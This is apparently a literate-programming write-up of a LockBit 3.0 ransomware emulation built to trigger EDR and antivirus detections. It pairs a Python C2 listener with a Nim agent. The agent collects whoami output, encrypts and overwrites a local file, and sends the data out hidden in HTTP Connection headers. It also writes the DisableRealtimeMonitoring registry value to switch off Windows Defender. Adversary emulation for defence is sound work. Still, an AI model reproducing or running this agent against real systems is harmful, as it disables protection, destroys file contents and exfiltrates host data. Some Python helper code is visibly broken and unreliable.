#+TITLE: LockBit 3.0 Simulation 
#+AUTHOR: Russell Brinson
#+DATE: [2023-08-09 Wed]

* Overview 
Creating a simulation of the LockBit 3.0 Ransomware with some of the known indicators of compromise. This is not meant to be malicious at all but hopefully has enough IoCs that are flagged as malware by EDR and AV.

This will be compromised of a very simple listening server in python for the c2 and the simulated malware in nim (please don't write malware in nim).

- [[https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a][#StopRansomware: LockBit 3.0 Cybersecurity Advisory by CISA]]

* Simulated C2 Server
Using the base of the C2 server with my [[https://github.com/rbrins/security-tools/blob/main/betterHttpServer.py][betterHttpServer]], which itself is just a hack of python's standard ~HttpServer~ module.
** Files in Listening Directory
These downloaded files ideally will trigger signature based detections. 
- LockBit 3.0 Black Icon
- NetworkShares.xml
- Services.xml

** HTTP Server listening for specific POST
According to the Cybersecurity Advisory, it looks like the encrypted data is within the ~Connection~ Header.
- Connection: Keep-Alive
- extract encrypted and encoded data
- decode then unencrypt data
*** Imports and Arguments
#+BEGIN_SRC python :tangle simulated-c2-server.py
import http.server
import socketserver
import argparse
import helpers

parser = argparse.ArgumentParser(
    prog = "Simulated C2 w/ HttpServer",
    description = "Changed Python's SimpleHTTPServer to receive fake/simulated C2 data")

parser.add_argument('-p', '--port', type=int, metavar="[0-65536]", default=8000)
parser.add_argument('-k', '--key')
parser.add_argument('-i', '--iv')

args = parser.parse_args()

port = args.port
key = args.key
iv = args.iv
#+END_SRC

*** Modified betterHttpServer
sorry this was before I did literate programming, also I wished I had commented and sourced a bit better.

Modifications:
- removed SpecifcHandler
- only does all headers
- added try/except with looking for the "Connection" header
- passing this connection header to another python function to begin pulling information from it
#+BEGIN_SRC python :tangle simulated-c2-server.py
class AllHeadersHandler(http.server.SimpleHTTPRequestHandler):

    def do_GET(self):
        http.server.SimpleHTTPRequestHandler.do_GET(self)

    def do_POST(self):
        try:
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.send_header('Connection', 'Keep-Alive')
            #self.send_header('Keep-Alive', 'timeout=5, max=100')
            self.end_headers()
            print("[i] Sent the headers")
            self.wfile.write(bytes(message, "utf8"))

            if (self.headers.get("Connection")):

               print("[i] Connection: " + self.headers.get("Connection")) # debugging print
               
               encodedEncryptedData = helpers.extractData(self.headers.get("Connection"))
               print("[i] Extracted Data: " + encodedEncryptedData)
               
               decodedEncryptedData = helpers.decodedData(encodedEncryptedData)
               print("[i] decodedEncryptedData Type: {}".format(type(decodedEncryptedData)))
               print("[i] decoded Encrypted Data: {}".format(decodedEncryptedData))
               
               #decodedDecryptedData = helpers.decryptData(key, decodedEncryptedData)
               #print("[+] Decoded Decrypted Data: {}".format(decodedDecryptedData))


        except:
            self.send_response(404)


Handler = AllHeadersHandler

print("Serving HTTP on 0.0.0.0 port {}...".format(port))
httpd = socketserver.TCPServer(("", port), Handler)

httpd.serve_forever()

#+END_SRC

** Helping Function to Decode and Decrypt
*** Extract encrypted and encoded data
#+BEGIN_SRC python :tangle helpers.py
import base64
import os
from Crypto.Cipher import AES

def extractData(connectionString):
    return connectionString[148:-166]
#+END_SRC

*** Decode Base64 and Decrypt AES


#+BEGIN_SRC python :tangle helpers.py
def decodedData(data):
    convertedbytes = base64.b64decode(data)


def decryptData(key, cipherText):
    """Simple AES decryptor function"""
    cipher = AES.new(key, AES.MODE_EAX, nonce=nonce)
    plaintext = cipher.decrypt(cipherText)
    try:
        cipher.verify(tag)
        return ("Decrypted Data: {}".format(plaintext))

    except ValueError:
        return "Key incorrect or message corrupted"
#+END_SRC



* Simulated Malware
** Commands Needed
- download file
- encrypt file
- send encrypted file contents in HTTP POST body
- attempt registry modification
- send status in HTTP POST body
- if cross compiling from linux then you need mingw installed 
- compile with ~nim compile -d:mingw --app:console simAgent.nim~

** Imported Modules & Global Variables
#+BEGIN_SRC nim :tangle simAgent.nim
import std/[asyncdispatch, httpclient, osproc, os, net, base64]
import nimcrypto
import winregistry except open

var passedKey: string = "Password1"
var passedIV: string = "1234567890ABCDEF"
let ipAddress: string = "192.168.56.5"
let portNum: int = 8000

var c2URL: string = ("http://" & ipAddress & ":" & $(portNum))
var lockbitIconUrl: string = "picture1_0.jpg"
var networkXmlUrl: string = "NetworkShares.xml"
var servicesXmlUrl: string = "Services.xml"
var file2Encrypt: string = "File2Encrypt.txt"
var registryKey: string = "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender"
var registryValue: string = "DisableRealtimeMonitoring"
var registryValueData: int32 = 1

#+END_SRC

** Debugging Helpers
#+BEGIN_SRC nim :tangle simAgent.nim

var debugToggle: bool = true

var error: string = "E"
var info: string = "i"
var success: string = "+"

proc debugMessage(msgType, msg: string, toggle: bool): void = 
    if toggle == true:
        echo ("[" & msgType & "] " & msg)

#+END_SRC

** Download File
#+BEGIN_SRC nim :tangle simAgent.nim

proc asyncProc(file2Download: string): Future[string] {.async.} =
    var client = newAsyncHttpClient()
    try:
      return await client.getContent(file2Download)
    finally:
      client.close()
#+END_SRC

** Get Basic Computer info
#+BEGIN_SRC nim :tangle simAgent.nim
proc getComputerInfo(): string =
    var currentDir = getCurrentDir()
    var whoami = execCmdEx("whoami")
    var data: string = ("{ CurrentDir: " & currentDir & " , Whoami: " & whoami[0] & " }")
    return data
#+END_SRC

** Read & Write File
#+BEGIN_SRC nim :tangle simAgent.nim
proc readFile(fileName: string): string =
    let f = open(fileName)
    defer: f.close()
    let firstLine = f.readLine()
    return firstLine

# writeFile(fileName, text) is a built in proc
#+END_SRC

** Encrypt Data
#+BEGIN_SRC nim :tangle simAgent.nim
proc encryptStr(data2encr, enckey, uniqueiv: string): string = 
    var
      ectx: CTR[aes256]
      key = newString(aes256.sizeKey)
      iv = newString(aes256.sizeBlock)
      plainText = newString(len(data2encr))
      encText = newString(len(data2encr))

    copyMem(addr plainText[0], unsafeaddr data2encr[0], len(data2encr))
    copyMem(addr key[0], unsafeaddr enckey[0], len(enckey))
    copyMem(addr iv[0], unsafeaddr uniqueiv[0], len(uniqueiv))

    ectx.init(key, iv)
    ectx.encrypt(plainText, encText)
    ectx.clear

    #echo "ENCRYPTED TEXT: ", encText
    return encText
#+END_SRC

** Send Custom HTTP POST
#+BEGIN_SRC nim :tangle simAgent.nim
proc httpPOST(url, encryptedEncodedData: string): void =
    var firstPart: string = "Keep-Alive LIWy=RJ51lB5GM&a4OuN=<Lockbit ID>&LoSyE3=8SZ1hdlhzld4&DHnd99T=rTx9xGlInO6X0zWW&2D6=Bokz&T1guL=MtRZsFCRMKyBmfmqI& 6SF3g=JPDt9lfJIQ&wQadZP="
    var lastPart: string = " Xni=AboZOXwUw&2rQnM4=94L&0b=ZfKv7c&NO1d=M2kJlyus&AgbDTb=xwSpba&8sr=EndL4n0HVZjxPR& m4ZhTTH=sBVnPY&xZDiygN=cU1pAwKEztU&=5q55aFIAfTVQWTEm&4sXwVWcyhy=l68FrIdBESIvfCkvYl"

    var smuggled: string = (firstPart & encryptedEncodedData & lastPart)

    let client = newHttpClient()
    client.headers = newHttpHeaders({ "Connection": smuggled })
    try:
        let response = client.request(url, httpMethod = HttpPost)
        debugMessage(info, ("Server response :" & response.status), debugToggle)
    finally:
        client.close()
#+END_SRC

** Modify Windows Registry 
- Need the hKey handle to be opened with the KEY_SET_VALUE access rights
- pinvoke for RegCreateKeyA https://www.pinvoke.net/default.aspx/advapi32/RegCreateKeyEx.html
- pinvoke for RegSetValueEx https://www.pinvoke.net/default.aspx/advapi32/RegSetValueEx.html 
- win32 API docs for RegCreateKeyExA https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regcreatekeyexa
- win32 API docs for RegSetValueExA https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regsetvalueexa
- win32 registry key security and access rights - https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-key-security-and-access-rights
- System Error Codes https://learn.microsoft.com/en-us/windows/win32/debug/system-error-codes--0-499-
  - a return of ~0~ is the ~ERROR_SUCCESS~
  - returning an int from each function

- using https://github.com/miere43/nim-registry/blob/devel/winregistry.nim


** Executing the Steps in Order
1. Download Icon
2. Download NetworkShares.xml
3. Download Services.xml
4. Sends User and Computer Name back to C2 via Connection header
5. Open and read file contents into variable
6. Encrypts file
7. Sends file contents back to C2 via Connection header
8. Disable Real-Time Protectio via Registry
9. Sends test completed back to C2 via Connection header

#+BEGIN_SRC nim :tangle simAgent.nim
echo "[+] Starting simAgent"
echo ("[i] Connecting to c2 URL: " & c2URL)

# Steps 1-3
echo "######################################################"
echo "#                Steps 1-3                           #"
echo "######################################################"

debugMessage(info, "Starting LockBit 3.0 Icon Download", debugToggle)
var lockbitIcon: string = waitFor asyncProc((c2URL & "/" & lockbitIconUrl))
writeFile(lockbitIconUrl, lockbitIcon)
debugMessage(success, "LockBit 3.0 Icon Downloaded and Written", debugToggle)

debugMessage(info, "Starting NetworkShares.xml Download", debugToggle)
var networkXml: string = waitFor asyncProc((c2URL & "/" & networkXmlUrl))
writeFile(networkXmlUrl, networkXml)
debugMessage(success, "NetworkShares.xml Downloaded and Written", debugToggle)

debugMessage(info, "Starting Services.xml Download", debugToggle)
var servicesXml: string =  waitFor asyncProc((c2URL & "/" & servicesXmlUrl))
writeFile(servicesXmlUrl, servicesXml)
debugMessage(success, "Services.xml Downloaded and Written", debugToggle)

# Steps 4-7
echo "######################################################"
echo "#                Steps 4-7                           #"
echo "######################################################"

debugMessage(info, "Starting getComputerInfo()", debugToggle)
var compInfo: string = getComputerInfo()
debugMessage(success, ("getComputerInfo(): " & compInfo), debugToggle) 

debugMessage(info, "Starting encryption of compInfo", debugToggle)
var encryptedInfo: string = encryptStr(compInfo, passedKey, passedIV)
debugMessage(success, "Encryption of compInfo completed", debugToggle)

debugMessage(info, "Starting encoding of encryptedInfo", debugToggle)
var encodedCompInfo: string = encode(encryptedInfo)
debugMessage(success, "Encoded of encryptedInfo completed", debugToggle)

debugMessage(info, "Starting HTTP POST of encodedCompInfo", debugToggle)
httpPOST(c2URL, encodedCompInfo)
debugMessage(success, "HTTP POST of encodedCompInfo successful", debugToggle)

debugMessage(info, ("Starting readFile " & file2Encrypt), debugToggle)
var fileContents: string = readFile(file2Encrypt)
debugMessage(success, "readFile contents completed", debugToggle)

debugMessage(info, "Starting encryption of read-in memory data", debugToggle)
var encryptedData: string = encryptStr(fileContents, passedKey, passedIV)
debugMessage(success, "Encryption of read-in memory data complete", debugToggle)

debugMessage(info, "Starting encoding of read-in memory data", debugToggle)
var encodedData: string = encode(encryptedData)
debugMessage(success, "Encoded of read-in memory data complete", debugToggle)

debugMessage(info, "Starting over-write of file contents with encrypted data", debugToggle)
writeFile(file2Encrypt, encryptedData)
debugMessage(success, "Over-write of file contents completed", debugToggle)

debugMessage(info, "Starting HTTP POST of encoded read-in data", debugToggle)
httpPOST(c2URL, encodedData)
debugMessage(success, "HTTP POST of encodedData successful", debugToggle)


# Step 8
echo "######################################################"
echo "#                Steps 8                             #"
echo "######################################################"

debugMessage(info, ("Opening registry key " & registryKey), debugToggle)
var h: RegHandle = createOrOpen(registryKey, samWrite)
debugMessage(success, "Opening key successful", debugToggle)

debugMessage(info, "Writing to registry key", debugToggle)
writeInt32(h, registryValue, registryValueData)
debugMessage(success, "Writing registry key successful", debugToggle)

# Step 9
echo "######################################################"
echo "#                Steps 9                             #"
echo "######################################################"
debugMessage(info, "Starting final HTTP POST", debugToggle)
httpPOST(c2URL, encode(encryptStr("Completed", passedKey, passedIV)))
#+END_SRC
